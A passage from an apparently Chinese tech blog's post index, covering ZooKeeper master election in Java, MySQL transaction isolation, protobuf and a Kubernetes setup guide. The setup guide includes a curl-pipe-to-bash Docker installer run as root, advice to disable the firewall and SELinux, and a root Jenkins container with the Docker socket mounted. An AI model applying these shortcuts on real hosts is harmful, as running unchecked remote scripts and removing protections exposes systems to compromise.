这里我们主要想实现的功能是：\n 有两个节点，bigdata001，bigdata002 ，他们互相主备。 bigdata001 启动时，往 zk 上注册一个临时节点 /ElectorLock（锁），并且往 /ActiveMaster 下面注册一个子节点，表示自己是主节点； bigdata002 启动时，发现临时节点 /ElectorLock 存在，表示当前系统已经有主节点了，则自己往 /StandbyMaster 下注册一个节点，表示自己是 standby。 bigdata001 退出时，释放 /ElectorLock，并且删除 /activeMaster 下的节点。 bigdata002 感知到 /ElectorLock 不存在时，则自己去注册 /ElectorLock，并在 /ActiveMaster 下注册自己，表示自己已经成为了主节点。  代码还是用 Curator 框架实现的：\npackage com.kkarch.zookeeper; import cn.hutool.core.util.StrUtil; import lombok.extern.slf4j.Slf4j; import org.apache.curator.framework.CuratorFramework; import org.apache.curator.framework.recipes.cache.TreeCache; import org.apache.curator.framework.recipes.cache.TreeCacheEvent; import org.apache.zookeeper.CreateMode; import java.nio.charset.StandardCharsets; /** * 分布式选举 * * @Author wangkai * @Time 2021/7/25 20:12 */ @Slf4j public class ElectorTest { private static final String PARENT = \u0026#34;/cluster_ha\u0026#34;; private static final String ACTIVE = PARENT + \u0026#34;/ActiveMaster\u0026#34;; private static final String STANDBY = PARENT + \u0026#34;/StandbyMaster\u0026#34;; private static final String LOCK = PARENT + \u0026#34;/ElectorLock\u0026#34;; private static final String HOSTNAME = \u0026#34;bigdata05\u0026#34;; private static final String activeMasterPath = ACTIVE + \u0026#34;/\u0026#34; + HOSTNAME; private static final String standByMasterPath = STANDBY + \u0026#34;/\u0026#34; + HOSTNAME; public static void main(String[] args) throws Exception { CuratorFramework zk = ZkUtil.createZkClient(\u0026#34;localhost:2181\u0026#34;); zk.start(); // 注册好监听  TreeCache treeCache = new TreeCache(zk, PARENT); treeCache.start(); treeCache.getListenable().addListener((client, event) -\u0026gt; { if (event.getType().equals(TreeCacheEvent.Type.INITIALIZED) || event.getType().equals(TreeCacheEvent.Type.CONNECTION_LOST) || event.getType().equals(TreeCacheEvent.Type.CONNECTION_RECONNECTED) || event.getType().equals(TreeCacheEvent.Type.CONNECTION_SUSPENDED)) { return; } System.out.println(event.getData()); // 如果 Active 下有节点被移除了，没有节点，则应该去竞选成为 Active  if (StrUtil.startWith(event.getData().getPath(), ACTIVE) \u0026amp;\u0026amp; event.getType().equals(TreeCacheEvent.Type.NODE_REMOVED)) { if (getChildrenNumber(zk, ACTIVE) == 0) { createZNode(client, LOCK, HOSTNAME.getBytes(StandardCharsets.UTF_8), CreateMode.EPHEMERAL); System.out.println(HOSTNAME + \u0026#34;争抢到了锁\u0026#34;); } } // 如果有锁节点被创建，则判断是不是自己创建的，如果是，则切换自己的状态为 ACTIVE  else if (StrUtil.equals(event.getData().getPath(), LOCK) \u0026amp;\u0026amp; event.getType().equals(TreeCacheEvent.Type.NODE_ADDED)) { if (StrUtil.equals(new String(event.getData().getData()), HOSTNAME)) { createZNode(zk, activeMasterPath, HOSTNAME.getBytes(StandardCharsets.UTF_8), CreateMode.EPHEMERAL); if (checkExists(client, standByMasterPath)) { deleteZNode(client, standByMasterPath); } } } }); // 先创建 ACTIVE 和 STANDBY 节点  if (zk.checkExists().forPath(ACTIVE) == null) { zk.create().creatingParentContainersIfNeeded().forPath(ACTIVE); } if (zk.checkExists().forPath(STANDBY) == null) { zk.create().creatingParentContainersIfNeeded().forPath(STANDBY); } // 判断 ACTIVE 下是否有子节点，如果没有则去争抢一把锁  if (getChildrenNumber(zk, ACTIVE) == 0) { createZNode(zk, LOCK, HOSTNAME.getBytes(StandardCharsets.UTF_8), CreateMode.EPHEMERAL); } // 如果有，则自己成为 STANDBY 状态  else { createZNode(zk, standByMasterPath, HOSTNAME.getBytes(StandardCharsets.UTF_8), CreateMode.EPHEMERAL); } Thread.sleep(1000000000); } public static int getChildrenNumber(CuratorFramework client, String path) throws Exception { return client.getChildren().forPath(path).size(); } public static void createZNode(CuratorFramework client, String path, byte[] data, CreateMode mode) { try { client.create().withMode(mode).forPath(path, data); } catch (Exception e) { log.error(\u0026#34;创建节点失败\u0026#34;, e); System.out.println(\u0026#34;创建节点失败了\u0026#34;); } } public static boolean checkExists(CuratorFramework client, String path) throws Exception { return client.checkExists().forPath(path) != null; } public static void deleteZNode(CuratorFramework client, String path) { try { if (checkExists(client, path)) { client.delete().forPath(path); } } catch (Exception e) { log.error(\u0026#34;删除节点失败\u0026#34;, e); } } } 参考 分布式协调框架 Zookeeper 核心设计 理解与实战，并实现一个主备切换 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/zookeeper/zookeeper%E6%A0%B8%E5%BF%83%E8%AE%BE%E8%AE%A1%E7%90%86%E8%A7%A3%E4%B8%8E%E5%AE%9E%E6%88%98/","series":["Manual"],"tags":["ZK"],"title":"Zookeeper核心设计理解与实战"},{"categories":["编程思想"],"content":"ZooKeeper命名空间中的每个znode都有一个与之关联的stat结构，类似于Unix/Linux文件系统中文件的stat结构。 znode的stat结构中的字段显示如下，各自的含义如下：\n cZxid：这是导致创建znode更改的事务ID。 mZxid：这是最后修改znode更改的事务ID。 pZxid：这是用于添加或删除子节点的znode更改的事务ID。 ctime：表示从1970-01-01T00:00:00Z开始以毫秒为单位的znode创建时间。 mtime：表示从1970-01-01T00:00:00Z开始以毫秒为单位的znode最近修改时间。 dataVersion：表示对该znode的数据所做的更改次数。 cversion：这表示对此znode的子节点进行的更改次数。 aclVersion：表示对此znode的ACL进行更改的次数。 ephemeralOwner：如果znode是ephemeral类型节点，则这是znode所有者的 session ID。 如果znode不是ephemeral节点，则该字段设置为零。 dataLength：这是znode数据字段的长度。 numChildren：这表示znode的子节点的数量。  在ZooKeeper Java shell中，可以使用stat或ls2命令查看znode的stat结构。 具体说明如下：\n使用stat命令查看znode的stat结构：\n[zk: localhost(CONNECTED) 0] stat /zookeeper cZxid = 0x0 ctime = Thu Jan 01 05:30:00 IST 1970 mZxid = 0x0 mtime = Thu Jan 01 05:30:00 IST 1970 pZxid = 0x0 cversion = -1 dataVersion = 0 aclVersion = 0 ephemeralOwner = 0x0 dataLength = 0 numChildren = 1 使用ls2命令查看znode的stat结构：\n[zk: localhost(CONNECTED) 1] ls2 /zookeeper [quota] cZxid = 0x0 ctime = Thu Jan 01 05:30:00 IST 1970 mZxid = 0x0 mtime = Thu Jan 01 05:30:00 IST 1970 pZxid = 0x0 cversion = -1 dataVersion = 0 aclVersion = 0 ephemeralOwner = 0x0 dataLength = 0 numChildren = 1 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/zookeeper/zookeeper%E7%9A%84stat%E7%BB%93%E6%9E%84/","series":["Manual"],"tags":["ZK"],"title":"ZooKeeper的stat结构"},{"categories":["编程思想"],"content":"什么是ZooKeeper?官网 介绍到：ZooKeeper is a centralized service for maintaining configuration information, naming, providing distributed synchronization, and providing group services. 这大概描述了Zookeeper主要可以干哪些事情：配置管理，名字服务，提供分布式同步以及集群管理。\n1. 配置管理 配置管理又被称为发布-订阅。\n在我们的应用中除了代码外，还有一些就是各种配置。比如数据库连接等。一般我们都是使用配置文件的方式，在代码中引入这些配置文件。但是当我们只有一种配置，只有一台服务器，并且不经常修改的时候，使用配置文件是一个很好的做法，但是如果我们配置非常多，有很多服务器都需要这个配置，而且还可能是动态的话使用配置文件就不是个好主意了。这个时候往往需要寻找一种集中管理配置的方法，我们在这个集中的地方修改了配置，所有对这个配置感兴趣的都可以获得变更。比如我们可以把配置放在数据库里，然后所有需要配置的服务都去这个数据库读取配置。但是，因为很多服务的正常运行都非常依赖这个配置，所以需要这个集中提供配置服务的服务具备很高的可靠性。一般我们可以用一个集群来提供这个配置服务，但是用集群提升可靠性，那如何保证配置在集群中的一致性呢？ 这个时候就需要使用一种实现了一致性协议的服务了。Zookeeper就是这种服务，它使用Zab这种一致性协议来提供一致性。现在有很多开源项目使用Zookeeper来维护配置，比如在HBase中，客户端就是连接一个Zookeeper，获得必要的HBase集群的配置信息，然后才可以进一步操作。还有在开源的消息队列Kafka中，也使用Zookeeper来维护broker的信息。\n应用中用到的一些配置信息放到ZK上进行集中管理。这类场景通常是这样：应用在启动的时候会主动来获取一次配置，同时，在节点上注册一个Watcher，这样一来，以后每次配置有更新的时候，都会实时通知到订阅的客户端，从来达到获取最新配置信息的目的。\n2. 命名服务 命名服务也是分布式系统中比较常见的一类场景。在分布式系统中，通过使用命名服务，客户端应用能够根据指定名字来获取资源或服务的地址，提供者等信息。被命名的实体通常可以是集群中的机器，提供的服务地址，远程对象等等——这些我们都可以统称他们为名字（Name）。其中较为常见的就是一些分布式服务框架中的服务地址列表。通过调用ZK提供的创建节点的API，能够很容易创建一个全局唯一的path，这个path就可以作为一个名称。\n阿里巴巴集团开源的分布式服务框架Dubbo中使用ZooKeeper来作为其命名服务，维护全局的服务地址列表，点击这里 查看Dubbo开源项目。在Dubbo实现中： 服务提供者在启动的时候，向ZK上的指定节点/dubbo/${serviceName}/providers目录下写入自己的URL地址，这个操作就完成了服务的发布。 服务消费者启动的时候，订阅/dubbo/${serviceName}/providers目录下的提供者URL地址， 并向/dubbo/${serviceName} /consumers目录下写入自己的URL地址。 注意，所有向ZK上注册的地址都是临时节点，这样就能够保证服务提供者和消费者能够自动感应资源的变化。 另外，Dubbo还有针对服务粒度的监控，方法是订阅/dubbo/${serviceName}目录下所有提供者和消费者的信息。\n3. 分布式锁 分布式锁，这个主要得益于ZooKeeper为我们保证了数据的强一致性。锁服务可以分为两类，一个是保持独占（排他锁），另一个是控制时序（共享锁/读锁）。\n所谓保持独占（排他锁），就是所有试图来获取这个锁的客户端，最终只有一个可以成功获得这把锁。通常的做法是把zk上的一个znode看作是一把锁，通过create znode的方式来实现。所有客户端都去创建 /distribute_lock节点，最终成功创建的那个客户端也即拥有了这把锁。\n控制时序（共享锁/读锁）是指所有试图来获取这个锁的客户端，最终都是会被安排执行，只是有个全局时序了。做法和上面基本类似，只是这里/distribute_lock已经预先存在，客户端在它下面创建临时有序节点（这个可以通过节点的属性控制：CreateMode.EPHEMERAL_SEQUENTIAL来指定）。Zk的父节点（/distribute_lock）维持一份sequence,保证子节点创建的时序性，从而也形成了每个客户端的全局时序。\n4. 集群管理 在分布式的集群中，经常会由于各种原因，比如硬件故障，软件故障，网络问题，有些节点会进进出出。有新的节点加入进来，也有老的节点退出集群。这个时候，集群中其他机器需要感知到这种变化，然后根据这种变化做出对应的决策。\n4.1 Master选举 Master选举则是ZooKeeper中最为经典的应用场景了。比如 HDFS 中 Active NameNode 的选举。在分布式环境中，相同的业务应用分布在不同的机器上，有些业务逻辑（例如一些耗时的计算，网络I/O处理），往往只需要让整个集群中的某一台机器进行执行，其余机器可以共享这个结果，这样可以大大减少重复劳动，提高性能，于是这个master选举便是这种场景下的碰到的主要问题。\n利用ZooKeeper的强一致性，能够保证在分布式高并发情况下节点创建的全局唯一性，即：同时有多个客户端请求创建 /currentMaster节点，最终一定只有一个客户端请求能够创建成功。利用这个特性，就能很轻易的在分布式环境中进行集群Master选举了。成功创建该节点的客户端所在的机器就成为了Master。同时，其他没有成功创建该节点的客户端，都会在该节点上注册一个子节点变更的 Watcher，用于监控当前 Master 机器是否存活，一旦发现当前的Master挂了，那么其他客户端将会重新进行 Master 选举。这样就实现了 Master 的动态选举。\n4.2 集群机器监控 这通常用于那种对集群中机器状态，机器在线率有较高要求的场景，能够快速对集群中机器变化作出响应。这样的场景中，往往有一个监控系统，实时检测集群机器是否存活。过去的做法通常是：监控系统通过某种手段（比如ping）定时检测每个机器，或者每个机器自己定时向监控系统汇报“我还活着”。这种做法可行，但是存在两个比较明显的问题：\n 将会产生一定的时延（受心跳长短限制）; 当集群中的节点发生变更时，其余的节点都需要对维护的集群文件（状态表）进行修改，修改内容多。  利用ZooKeeper有两个特性，就可以实时另一种集群机器存活性监控系统：\n 客户端在节点 x 上注册一个Watcher，那么如果x的子节点变化了，会通知该客户端。 创建EPHEMERAL类型的节点，一旦客户端和服务器的会话结束或过期，那么该节点就会消失。  例如，监控系统在/clusterServers节点上注册一个Watcher，以后每动态加机器，那么就往/clusterServers下创建一个 EPHEMERAL类型的节点：/clusterServers/{hostname}. 这样，监控系统就能够实时知道机器的增减情况，至于后续处理就是监控系统的业务了。\n参考链接 【分布式解决方案】ZooKeeper经典应用场景 Zookeeper-Zookeeper可以干什么 ZooKeeper典型应用场景一览 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/zookeeper/zookeeper%E8%83%BD%E5%81%9A%E4%BB%80%E4%B9%88/","series":["Manual"],"tags":["ZK"],"title":"ZooKeeper能做什么"},{"categories":["编程思想"],"content":"一个SQL执行的很慢，我们要分两种情况讨论：\n大多数情况下很正常，偶尔很慢  数据库在刷新脏页，例如 redo log 写满了需要同步到磁盘。  当我们要往数据库插入一条数据、或者要更新一条数据的时候，我们知道数据库会在内存中把对应字段的数据更新了，但是更新之后，这些更新的字段并不会马上同步持久化到磁盘中去，而是把这些更新的记录写入到 redo log 日记中去，等到空闲的时候，在通过 redo log 里的日记把最新的数据同步到磁盘中去。写redo log是顺序io\n 执行的时候，遇到锁，如表锁、行锁。  这条 SQL 语句一直执行的很慢  没有用上索引：例如该字段没有索引；由于对字段进行运算、函数操作导致无法用索引。 数据库选错了索引。  参考 腾讯面试：一条SQL语句执行得很慢的原因有哪些？\u0026mdash;不看后悔系列 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/mysql/%E4%B8%80%E4%B8%AAsql%E6%89%A7%E8%A1%8C%E7%9A%84%E5%BE%88%E6%85%A2/","series":["Manual"],"tags":["MySQL"],"title":"一个SQL执行的很慢"},{"categories":["云原生"],"content":"什么是云原生？ 云原生是一种构建和运行应用程序的方法，是一套技术体系和方法论。云原生（CloudNative）是一个组合词，Cloud+Native。Cloud表示应用程序位于云中，而不是传统的数据中心；Native表示应用程序从设计之初即考虑到云的环境，原生为云而设计，在云上以最佳姿势运行，充分利用和发挥云平台的弹性+分布式优势。\n 什么是云原生架构？ 采用开源堆栈（K8S+Docker）进行容器化，基于微服务架构提高灵活性和可维护性，借助敏捷方法、DevOps支持持续迭代和运维自动化，利用云平台设施实现弹性伸缩、动态调度、优化资源利用率。\n什么是云原生应用？ 在架构设计、开发方式、部署维护等各个阶段和方面都基于云的特点建设的应用。\n 什么是容器编排？ 容器编排是指自动化容器的部署、管理、扩展和联网。\n k8s周边：\n k3s : 轻量化k8s k9s : kubectl命令的封装 KubeOperator : 国产k8s发行版 Kubesphere : k8s企业级别增强（多云、多集群） kubeedge : 边缘计算 Kubeless : 面向serverless的k8s   什么是服务网格？ k8s/istio与云原生的关系？ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%9F%BA%E7%A1%80/%E4%B8%80%E4%BA%9B%E6%A6%82%E5%BF%B5/","series":["k8s"],"tags":["云原生","k8s"],"title":"一些概念"},{"categories":["持续集成部署"],"content":"为docker容器安装工具\n因为我的docker jenkins需要node环境，默认是没有的，所以最初想法是和maven一样，将宿主机的maven和docker一起共享使用，但是不管怎么操作就不行，很诡异，同样的操作，maven可以执行，jdk和node却不行，如下所示：\nversion: \u0026#39;3\u0026#39; services: jenkins: image: jenkinsci/blueocean deploy: resources: limits: cpus: \u0026#39;0.50\u0026#39; memory: 1024M reservations: memory: 64M container_name: jenkins user: root ports: - \u0026#39;8080:8080\u0026#39; - \u0026#39;50000:50000\u0026#39; volumes: - \u0026#39;/docker/volumes/jenkins:/var/jenkins_home\u0026#39; - \u0026#39;/var/run/docker.sock:/var/run/docker.sock\u0026#39; - \u0026#39;/usr/local/jdk1.8.0_241:/usr/local/jdk1.8.0_241\u0026#39; - \u0026#39;/usr/local/apache-maven-3.6.3:/usr/local/apache-maven-3.6.3\u0026#39; - \u0026#39;/usr/bin/docker:/usr/bin/docker\u0026#39; - \u0026#39;/usr/local/node-v12.16.3-linux-x64:/usr/local/node-v12.16.3-linux-x64\u0026#39; restart: always  更诡异的是，虽然docker下无法执行node命令，jenkins却能调用：\n这里暂且不管，请当作docker没有node环境，继续往下阅读。\n 经过彻夜未眠的排除，基本能定位为题的原因：本质不是node命令找不到，而是node的依赖在docker容器里面找不到，node依赖如下：\n所以要么进入到容器里面使用apk add，要么自己制作镜像（这样太麻烦了），我选择前者。\n进入到容器里面安装：\napk add --no-cache nodejs  可能会遇到下载缓慢、找不到包等问题。\n 解决办法如下：\n 在 https://mirrors.alpinelinux.org/ 找到中国的镜像仓库，并添加到 etc/apk/repositories, 参考如下： A. 永久修改下载源\nvi etc/apk/repositories http://mirrors.aliyun.com/alpine/v3.8/main/ http://mirrors.aliyun.com/alpine/v3.8/community/ apk update B. 临时修改下载源地址 如果上面的永久源地址找不到对应的包，可使用本方法，参考如下： B.1. 先通过 https://pkgs.alpinelinux.org/packages 找到你要下载的package对应的Branch和Repository。 B.2. 添加package\napk add gradle --repository http://mirrors.tuna.tsinghua.edu.cn/alpine/edge/community  参考链接： https://pkgs.alpinelinux.org/packages https://mirrors.alpinelinux.org/ https://www.cnblogs.com/sunsky303/p/11548343.html https://my.oschina.net/u/1422143/blog/1858790 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cicd/%E4%B8%BAdocker%E5%AE%B9%E5%99%A8%E5%AE%89%E8%A3%85%E5%B7%A5%E5%85%B7/","series":null,"tags":["docker"],"title":"为docker容器安装工具"},{"categories":["编程思想"],"content":"为什么需要protobuf  protobuf采用字节编码，而json, xml都是字符编码，字节编码更加节省空间 采用了varint编码，进一步降低了编码后的空间大小  Varint就是一种对数字进行编码的方法，编码后二进制数据是不定长的，数值越小的数字使用的字节数越少。例如对于int32_t，采用Varint编码后需要1~5个bytes，小的数字使用1个byte，大的数字使用5个bytes。基于实际场景中小数字的使用远远多于大数字，因此通过Varint编码对于大部分场景都可以起到一个压缩的效果。\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/other/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81protobuf/","series":["Manual"],"tags":["Other"],"title":"为什么需要protobuf"},{"categories":["编程思想"],"content":"参考链接： 手把手带你实战下Spring的七种事务传播行为 Spring的PROPAGATION_NESTED和PROPAGATION_REQUIRES_NEW的区别？ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/spring/%E4%BA%8B%E5%8A%A1%E4%BC%A0%E6%92%AD%E5%AE%9E%E6%88%98/","series":["Manual"],"tags":["Spring"],"title":"事务传播实战"},{"categories":["编程思想"],"content":"事务具有原子性（Atomicity）、一致性（Consistency）、隔离性（Isolation）、持久性（Durability）四个特性，简称 ACID，缺一不可。原子性由undo log保证，持久性由redo log保证，今天要说的就是隔离性。\n标准SQL通过行共享锁、行排他锁、表共享锁、表排他锁实现四种事务隔离级别，InnoDB事务在RU, S 两种隔离级别实现原理和标准SQL差不多，在RC级别它通过MVCC提前标准SQL一个级别解决了不可重复读，在RR级别通过间隙锁提前标准SQL一个隔离级别解决了幻读。（MVCC: 为了不加锁解决读写冲突的问题）\n1. 概念说明 以下几个概念是事务隔离级别要实际解决的问题，所以需要搞清楚都是什么意思。\n脏读 脏读指的是读到了其他事务未提交的数据，未提交意味着这些数据可能会回滚，也就是可能最终不会存到数据库中，也就是不存在的数据。读到了并一定最终存在的数据，这就是脏读。\n可重复读 可重复读指的是在一个事务内，最开始读到的数据和事务结束前的任意时刻读到的同一批数据都是一致的。通常针对数据**更新（UPDATE）**操作。\n不可重复读 对比可重复读，不可重复读指的是在同一事务内，不同的时刻读到的同一批数据可能是不一样的，可能会受到其他事务的影响，比如其他事务改了这批数据并提交了。通常针对数据**更新（UPDATE）**操作。\n幻读 幻读是针对数据**插入（INSERT）**操作来说的。假设事务A对某些行的内容作了更改，但是还未提交，此时事务B插入了与事务A更改前的记录相同的记录行，并且在事务A提交之前先提交了，而这时，在事务A中查询，会发现好像刚刚的更改对于某些数据未起作用，但其实是事务B刚插入进来的，让用户感觉很魔幻，感觉出现了幻觉，这就叫幻读。\n2. 事务隔离级别 SQL 标准定义了四种隔离级别，MySQL 全都支持。这四种隔离级别分别是：\n 读未提交（READ UNCOMMITTED） 读提交 （READ COMMITTED） 可重复读 （REPEATABLE READ） 串行化 （SERIALIZABLE）  从上往下，隔离强度逐渐增强，性能逐渐变差。采用哪种隔离级别要根据系统需求权衡决定，其中，可重复读是 MySQL 的默认级别。\n事务隔离其实就是为了解决上面提到的脏读、不可重复读、幻读这几个问题，下面展示了 4 种隔离级别对这三个问题的解决程度。\n只有串行化的隔离级别解决了全部这 3 个问题，其他的 3 个隔离级别都有缺陷。\n3. 标准SQL事务隔离级别实现原理 我们上面遇到的问题其实就是并发事务下的控制问题，解决并发事务的最常见方式就是悲观并发控制了（也就是数据库中的锁）。标准SQL事务隔离级别的实现是依赖锁的，我们来看下具体是怎么实现的：\n   事务隔离级别 实现方式     未提交读（RU） 事务对当前被读取的数据不加锁；事务在更新某数据的瞬间（就是发生更新的瞬间），必须先对其加行级共享锁，直到事务结束才释放。   提交读（RC） 事务对当前被读取的数据加行级共享锁（当读到时才加锁），一旦读完该行，立即释放该行级共享锁；事务在更新某数据的瞬间（就是发生更新的瞬间），必须先对其加行级排他锁，直到事务结束才释放。   可重复读（RR） 事务在读取某数据的瞬间（就是开始读取的瞬间），必须先对其加行级共享锁，直到事务结束才释放；事务在更新某数据的瞬间（就是发生更新的瞬间），必须先对其加行级排他锁，直到事务结束才释放。   序列化读（S） 事务在读取数据时，必须先对其加表级共享锁 ，直到事务结束才释放；事务在更新数据时，必须先对其加表级排他锁 ，直到事务结束才释放。    可以看到，在只使用锁来实现隔离级别的控制的时候，需要频繁的加锁解锁，而且很容易发生读写的冲突（例如在RC级别下，事务A更新了数据行1，事务B则在事务A提交前读取数据行1都要等待事务A提交并释放锁）。\n为了不加锁解决读写冲突的问题，MySQL引入了MVCC（Multiversion concurrency control）机制，详细可见我以前的分析文章：一文读懂数据库中的乐观锁和悲观锁和MVCC 。\n 共享锁、排他锁都是悲观锁。\n 4. InnoDB事务隔离级别实现原理 在往下分析之前，我们有几个概念需要先了解下：\n4.1 锁定读和一致性非锁定读 锁定读：在一个事务中，主动给读加锁，如SELECT \u0026hellip; LOCK IN SHARE MODE 和 SELECT \u0026hellip; FOR UPDATE。分别加上了行共享锁和行排他锁。15.7.2.4 Locking Reads 一致性非锁定读：InnoDB使用MVCC向事务的查询提供某个时间点的数据库快照。查询会看到在该时间点之前提交的事务所做的更改，而不会看到稍后或未提交的事务所做的更改（本事务除外）。也就是说在开始了事务之后，事务看到的数据就都是事务开启那一刻的数据了，其他事务的后续修改不会在本次事务中可见。\nConsistent read是InnoDB在RC和RR隔离级别处理SELECT语句的默认模式。一致性非锁定读不会对其访问的表设置任何锁，因此，在对表执行一致性非锁定读的同时，其它事务可以同时并发的读取或者修改它们。15.7.2.3 Consistent Nonlocking Reads 4.2 当前读和快照读 当前读\n读取的是最新版本，像UPDATE、DELETE、INSERT、SELECT \u0026hellip; LOCK IN SHARE MODE、SELECT \u0026hellip; FOR UPDATE这些操作都是一种当前读，为什么叫当前读？就是它读取的是记录的最新版本，读取时还要保证其他并发事务不能修改当前记录，会对读取的记录进行加锁。\n快照读\n读取的是快照版本，也就是历史版本，像不加锁的SELECT操作就是快照读，即不加锁的非阻塞读；快照读的前提是隔离级别不是未提交读和序列化读级别，因为未提交读总是读取最新的数据行，而不是符合当前事务版本的数据行，而序列化读则会对表加锁。\n4.3 隐式锁定和显式锁 隐式锁定\nInnoDB在事务执行过程中，使用两阶段锁协议（不主动进行显示锁定的情况）：\n 随时都可以执行锁定，InnoDB会根据隔离级别在需要的时候自动加锁； 锁只有在执行commit或者rollback的时候才会释放，并且所有的锁都是在同一时刻被释放。  显式锁定\n InnoDB也支持通过特定的语句进行显示锁定（存储引擎层）  select ... lock in share mode //共享锁 select ... for update //排他锁  MySQL Server层的显示锁定：  lock table unlock table 了解完上面的概念后，我们来看下InnoDB的事务具体是怎么实现的（下面的读都指的是非主动加锁的select）\n   事务隔离级别 实现方式     未提交读（RU） 事务对当前被读取的数据不加锁，都是当前读；事务在更新某数据的瞬间（就是发生更新的瞬间），必须先对其加行级共享锁，直到事务结束才释放。   提交读（RC） 事务对当前被读取的数据不加锁，且是快照读；事务在更新某数据的瞬间（就是发生更新的瞬间），必须先对其加行级排他锁（Record），直到事务结束才释放。通过快照（MVCC），在这个级别MySQL就解决了不可重复读的问题   可重复读（RR） 事务对当前被读取的数据不加锁，且是快照读；事务在更新某数据的瞬间（就是发生更新的瞬间），必须先对其加行级排他锁（Record，GAP，Next-Key），直到事务结束才释放。通过间隙锁，在这个级别MySQL就解决了幻读的问题   序列化读（S） 事务在读取数据时，必须先对其加表级共享锁 ，直到事务结束才释放，都是当前读；事务在更新数据时，必须先对其加表级排他锁 ，直到事务结束才释放。    可以看到，InnoDB通过MVCC很好的解决了读写冲突的问题，而且提前一个级别就解决了标准级别下会出现的幻读和不可重复读问题，大大提升了数据库的并发能力。\n参考 深入理解MySQL中事务隔离级别的实现原理 MySQL事务隔离级别和实现原理（看这一篇文章就够了！） Innodb中的事务隔离级别和锁的关系 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/mysql/%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB%E5%92%8C%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/","series":["Manual"],"tags":["MySQL"],"title":"事务隔离级别和实现原理"},{"categories":["云原生"],"content":"阿里云 ACK 腾讯云 TKE 华为云 CCE AWS EKS Google GKE Azure AKS DigitalOcean k8s Oracle OKE\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%9F%BA%E7%A1%80/k8s%E5%9F%BA%E7%A1%80/%E4%BA%91%E5%8E%82%E5%95%86%E9%9B%86%E6%88%90k8s/","series":["k8s"],"tags":["云原生","k8s"],"title":"云厂商集成k8s"},{"categories":["云原生"],"content":"从零搭建K8S\n机器准备    名称 数量 IP 备注     master 1 172.17.0.14 操作系统: Linux(centos7, 其它操作系统也可, 安装过程类似, 可参考官方文档) 机器配置: 4C8G   node1 1 172.18.0.7 同上   node2 1 172.19.0.5 同上    由于本人很穷，这几台机器是分别属于不同的腾讯云账号，不同的账号之间不能内网通信，不过可以通过建立“对等连接”实现通信，比直接用公网通信靠谱。\n1. 修改hostname [root@k8s-master ~]$ vim /etc/hostname # 修改hostname [root@k8s-master ~]$ vim /etc/hosts\t# 将本机IP指向hostname [root@k8s-master ~]$ reboot -h # 重启(可以做完全部前期准备后再重启) 修改后：\n[root@k8s-master ~]# cat /etc/hosts ::1 VM_0_5_centos VM_0_5_centos ::1 localhost.localdomain localhost ::1 localhost6.localdomain6 localhost6 127.0.0.1 localhost localhost.localdomain k8s-master 172.17.0.14 k8s-master 172.18.0.7 k8s-node1 172.19.0.5 k8s-node2 2. 配置防火墙 笔者图方便, 直接关闭了防火墙. 若安全要求较高, 可以参考官方文档放行必要端口.\n[root@k8s-master ~]$ systemctl stop firewalld\t# 关闭服务 [root@k8s-master ~]$ systemctl disable firewalld\t# 禁用服务 3. 禁用SELinux 腾讯云centos7.6默认是禁止的，如果你的不是，请修改/etc/selinux/config, 设置SELINUX=disabled. 重启机器.\n[root@k8s-master ~]$ sestatus\t# 查看SELinux状态 SELinux status: disabled 4. 禁用交换分区 腾讯云centos7.6默认是禁止的，如果你的不是，请编辑/etc/fstab, 将swap注释掉. 重启机器.\n[root@k8s-master ~]$ vim /etc/fstab #/dev/mapper/cl-swap swap swap defaults 0 0 5. 安装Docker 方法一： 官方安装脚本自动安装\ncurl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun 方法二： 手动安装\n//第一步 yum install -y yum-utils \\ device-mapper-persistent-data \\ lvm2 //第二步 yum-config-manager \\ --add-repo \\ http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo //第三步 yum install docker-ce docker-ce-cli containerd.io //第四步 systemctl start docker 配置docker：\n[root@k8s-master ~]# cat /etc/docker/daemon.json  { \u0026#34;registry-mirrors\u0026#34;: [ \u0026#34;https://mirror.ccs.tencentyun.com\u0026#34;], \u0026#34;exec-opts\u0026#34;: [\u0026#34;native.cgroupdriver=systemd\u0026#34;], \u0026#34;bip\u0026#34;: \u0026#34;172.200.0.1/16\u0026#34; } 安装配置完毕后执行:\n[root@k8s-master ~]$ systemctl enable docker [root@k8s-master ~]$ systemctl start docker 6. 安装Kubernetes 由于国内网络原因, 官方文档中的地址不可用, 本文替换为阿里云镜像地址, 执行以下代码即可:\ncat \u0026lt;\u0026lt;EOF \u0026gt; /etc/yum.repos.d/kubernetes.repo [kubernetes] name=Kubernetes baseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64 enabled=1 gpgcheck=1 repo_gpgcheck=1 gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg EOF 安装kubeadm，kubelet，kubectl：\nyum install -y kubelet kubeadm kubectl systemctl enable kubelet \u0026amp;\u0026amp; systemctl start kubelet 修改网络配置：\ncat \u0026lt;\u0026lt;EOF \u0026gt; 